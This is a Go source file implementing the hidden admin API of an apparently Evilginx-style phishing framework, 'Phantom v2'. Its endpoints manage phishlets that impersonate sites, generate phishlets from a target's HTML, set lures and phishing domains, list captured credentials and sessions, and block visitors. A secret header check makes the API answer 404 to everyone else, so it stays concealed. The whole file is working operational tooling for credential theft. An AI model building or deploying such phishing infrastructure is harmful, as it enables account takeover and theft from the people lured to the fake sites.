// Package api — stealth API (Pro-паритет, v1).
// Pro: тот же 443 + секретный hostname + mTLS client cert.
// v1 lab: отдельный :8080 + обязательный X-Stealth-Host == stealth_hostname.
// mTLS включается автоматически если ca_file существует.
package api

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/internal/metrics"
	"github.com/phantom-v2/phantom/internal/webui"
)

// DomainPresets — сохраненные домены (реализация *sqlite.DB).
type DomainPresets interface {
	AddDomainPreset(domain string) error
	ListDomainPresets() ([]string, error)
	RemoveDomainPreset(domain string) error
}

type Deps struct {
	StealthHost string
	CAFile      string
	Store       core.PhishletStore
	Blocked     core.Blocklist
	Lures       core.LureStore
	StartedAt   time.Time
	Token       string // PHANTOM_API_TOKEN: если задан — обязательный Bearer
	Limit       Limiter
	OnSmart     func(in SmartLureIn) // персист smart-lure (main wires sqlite)
	NodeID      string               // node_id в stats (мульти-нода)
	Config      func() map[string]any
	Presets     DomainPresets
	Caps        func(limit int) ([]map[string]any, error)
	Campaigns   any          // *campaign.Service (type-assert CampService)
	PhishDir    string       // dir для reload/persist YAML (hot-reload)
	OnReload    func() error // Reload стора (main wires store.Reload)
	OnUpsert    func(yaml []byte) (string, error)
	OnGenerate  func(origin, domain, id, sub, html string) (string, error)
}

// Limiter — rate-limit для API.
type Limiter interface{ Allow(ip string) bool }

func Handler(d Deps) http.Handler {
	mux := http.NewServeMux()
	guard := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != "/health" && r.Header.Get("X-Stealth-Host") != d.StealthHost {
				http.Error(w, "not found", http.StatusNotFound)
				return
			}
			if d.Limit != nil && !d.Limit.Allow(clientIP(r)) {
				if rl, ok := d.Limit.(interface{ RetryAfter(string) int64 }); ok {
					w.Header().Set("Retry-After", strconv.FormatInt(rl.RetryAfter(clientIP(r)), 10))
				}
				http.Error(w, "rate limited", http.StatusTooManyRequests)
				return
			}
			if d.Token != "" && r.URL.Path != "/health" {
				if r.Header.Get("Authorization") != "Bearer "+d.Token {
					http.Error(w, "unauthorized", http.StatusUnauthorized)
					return
				}
			}
			next(w, r)
		}
	}
	campRoutes(mux, d, guard)
	checkRoutes(mux, d, guard)
	mux.HandleFunc("/health", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte("ok"))
	})
	// /ui — статика без stealth-хедера (браузерная навигация его не ставит),
	// но только с loopback или stealth-Host, иначе 404.
	ui := webui.Handler()
	mux.HandleFunc("/ui/", func(w http.ResponseWriter, r *http.Request) {
		if hostOnly(r.Host) != d.StealthHost && !isLoopback(r.RemoteAddr) {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
		http.StripPrefix("/ui", ui).ServeHTTP(w, r)
	})
	mux.HandleFunc("/api/v1/stats", guard(func(w http.ResponseWriter, _ *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]any{
			"node":      d.NodeID,
			"phishlets": d.Store.Count(),
			"uptime_s":  int(time.Since(d.StartedAt).Seconds()),
		})
	}))
	// Пресеты доменов для выбора из списка (меню).
	mux.HandleFunc("/api/v1/domains", guard(func(w http.ResponseWriter, r *http.Request) {
		if d.Presets == nil {
			http.Error(w, "presets disabled", http.StatusNotImplemented)
			return
		}
		switch r.Method {
		case http.MethodGet:
			list, err := d.Presets.ListDomainPresets()
			if err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}
			if list == nil {
				list = []string{}
			}
			_ = json.NewEncoder(w).Encode(list)
		case http.MethodPost:
			var in struct {
				Domain string `json:"domain"`
			}
			if err := json.NewDecoder(io.LimitReader(r.Body, 4096)).Decode(&in); err != nil || in.Domain == "" {
				http.Error(w, "need domain", http.StatusBadRequest)
				return
			}
			if err := d.Presets.AddDomainPreset(in.Domain); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			w.WriteHeader(http.StatusCreated)
		default:
			http.Error(w, "method", http.StatusMethodNotAllowed)
		}
	}))
	mux.HandleFunc("/api/v1/domains/", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodDelete {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		if d.Presets == nil {
			http.Error(w, "presets disabled", http.StatusNotImplemented)
			return
		}
		domain := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/v1/domains/"), "/")
		if domain == "" || strings.Contains(domain, "/") {
			http.Error(w, "bad domain", http.StatusBadRequest)
			return
		}
		if err := d.Presets.RemoveDomainPreset(domain); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusNoContent)
	}))
	// Конфиг сервера для меню (БЕЗ секретов: токены/ключи не отдаем).
	mux.HandleFunc("/api/v1/captures", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		if d.Caps == nil {
			http.Error(w, "captures disabled", http.StatusNotImplemented)
			return
		}
		lim := 50
		if q := r.URL.Query().Get("limit"); q != "" {
			if n, err := strconv.Atoi(q); err == nil && n > 0 && n <= 200 {
				lim = n
			}
		}
		rows, err := d.Caps(lim)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		if rows == nil {
			rows = []map[string]any{}
		}
		_ = json.NewEncoder(w).Encode(rows)
	}))
	mux.HandleFunc("/api/v1/config", guard(func(w http.ResponseWriter, _ *http.Request) {
		cfg := map[string]any{"node": d.NodeID}
		if d.Config != nil {
			for k, v := range d.Config() {
				cfg[k] = v
			}
		}
		_ = json.NewEncoder(w).Encode(cfg)
	}))
	mux.HandleFunc("/api/v1/phishlets/detail", guard(func(w http.ResponseWriter, _ *http.Request) {
		type row struct {
			ID      string   `json:"id"`
			Enabled bool     `json:"enabled"`
			Domains []string `json:"domains"`
		}
		out := []row{}
		for _, p := range d.Store.All() {
			out = append(out, row{p.ID, p.Enabled, append([]string(nil), p.BaseDomains...)})
		}
		_ = json.NewEncoder(w).Encode(out)
	}))
	mux.HandleFunc("/api/v1/phishlets", guard(func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			ids := []string{}
			for _, p := range d.Store.All() {
				ids = append(ids, p.ID)
			}
			_ = json.NewEncoder(w).Encode(ids)
		case http.MethodPost:
			// Hot-add YAML без рестарта.
			body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
			if err != nil || len(body) == 0 {
				http.Error(w, "bad yaml", http.StatusBadRequest)
				return
			}
			if d.OnUpsert == nil {
				http.Error(w, "upsert disabled", http.StatusNotImplemented)
				return
			}
			id, err := d.OnUpsert(body)
			if err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			w.WriteHeader(http.StatusCreated)
			_, _ = w.Write([]byte(id))
		default:
			http.Error(w, "method", http.StatusMethodNotAllowed)
		}
	}))
	mux.HandleFunc("/api/v1/phishlets/reload", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		if d.OnReload == nil {
			http.Error(w, "reload disabled", http.StatusNotImplemented)
			return
		}
		if err := d.OnReload(); err != nil {
			http.Error(w, err.Error(), http.StatusUnprocessableEntity)
			return
		}
		w.WriteHeader(http.StatusNoContent)
	}))
	// Админка фишлета: домены (как `phishlets hostname`) и вкл/выкл.
	// PUT /api/v1/phishlets/{id} {"domains":[...], "enabled":bool}
	mux.HandleFunc("/api/v1/phishlets/", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPut {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		id := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/v1/phishlets/"), "/")
		if id == "" || strings.Contains(id, "/") {
			http.Error(w, "bad id", http.StatusBadRequest)
			return
		}
		admin, ok := d.Store.(phishletAdmin)
		if !ok {
			http.Error(w, "admin disabled", http.StatusNotImplemented)
			return
		}
		var in struct {
			Domains *[]string `json:"domains"`
			Enabled *bool     `json:"enabled"`
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 64<<10)).Decode(&in); err != nil {
			http.Error(w, "bad json", http.StatusBadRequest)
			return
		}
		if in.Domains != nil {
			if err := admin.SetDomains(id, *in.Domains); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
		}
		if in.Enabled != nil {
			if err := admin.SetEnabled(id, *in.Enabled); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
		}
		if err := admin.Save(id); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusNoContent)
	}))
	mux.HandleFunc("/api/v1/phishlets/generate", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		if d.OnGenerate == nil {
			http.Error(w, "generate disabled", http.StatusNotImplemented)
			return
		}
		var in struct {
			Origin, Domain, ID, Sub, HTML string
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(&in); err != nil || in.Origin == "" || in.Domain == "" || in.ID == "" {
			http.Error(w, "need origin, domain, id", http.StatusBadRequest)
			return
		}
		yml, err := d.OnGenerate(in.Origin, in.Domain, in.ID, in.Sub, in.HTML)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.Header().Set("Content-Type", "text/yaml")
		_, _ = w.Write([]byte(yml))
	}))
	mux.HandleFunc("/api/v1/block", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		var in struct {
			Key, Reason string
		}
		if err := json.NewDecoder(r.Body).Decode(&in); err != nil || in.Key == "" {
			http.Error(w, "bad json", http.StatusBadRequest)
			return
		}
		d.Blocked.Block(in.Key, in.Reason)
		w.WriteHeader(http.StatusNoContent)
	}))
	mux.HandleFunc("/api/v1/lures", guard(func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			_ = json.NewEncoder(w).Encode(d.Lures)
		case http.MethodPost:
			var in SmartLureIn
			if err := json.NewDecoder(r.Body).Decode(&in); err != nil || in.Path == "" || in.PhishletID == "" {
				http.Error(w, "bad json", http.StatusBadRequest)
				return
			}
			if err := CreateSmartLure(d.Lures, in); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			if d.OnSmart != nil {
				d.OnSmart(in)
			}
			w.WriteHeader(http.StatusCreated)
		default:
			http.Error(w, "method", http.StatusMethodNotAllowed)
		}
	}))
	mux.HandleFunc("/dashboard", guard(func(w http.ResponseWriter, _ *http.Request) {
		req, blk, cap := metrics.Snapshot()
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprintf(w, `<!doctype html><html><head><meta charset="utf-8"><title>Phantom</title></head><body>
<h1>Phantom v2</h1><p>phishlets=%d uptime=%ds</p><p>requests=%d blocked=%d captures=%d</p><ul>`,
			d.Store.Count(), int(time.Since(d.StartedAt).Seconds()), req, blk, cap)
		for _, p := range d.Store.All() {
			fmt.Fprintf(w, "<li>%s domains=%d</li>", p.ID, len(p.BaseDomains))
		}
		_, _ = w.Write([]byte(`</ul></body></html>`))
	}))
	return mux
}

// MTLSConfig возвращает nil если ca_file отсутствует (lab http).
func MTLSConfig(caFile string) (*tls.Config, error) {
	if caFile == "" {
		return nil, nil
	}
	b, err := os.ReadFile(caFile)
	if err != nil {
		return nil, nil // lab: файла нет — работаем без mTLS
	}
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(b)
	return &tls.Config{ClientCAs: pool, ClientAuth: tls.VerifyClientCertIfGiven}, nil
}

func clientIP(r *http.Request) string {
	if h := r.Header.Get("X-Forwarded-For"); h != "" {
		return h
	}
	return r.RemoteAddr
}

// phishletAdmin runtime-админка стора (реализация *phishlet.Store).
type phishletAdmin interface {
	SetDomains(id string, domains []string) error
	SetEnabled(id string, enabled bool) error
	Save(id string) error
}

func hostOnly(h string) string {
	if host, _, err := net.SplitHostPort(h); err == nil {
		return host
	}
	return strings.Trim(h, "[]")
}

func isLoopback(remote string) bool {
	host := hostOnly(remote)
	if host == "127.0.0.1" || host == "::1" {
		return true
	}
	if ip := net.ParseIP(host); ip != nil {
		return ip.IsLoopback()
	}
	return false
}
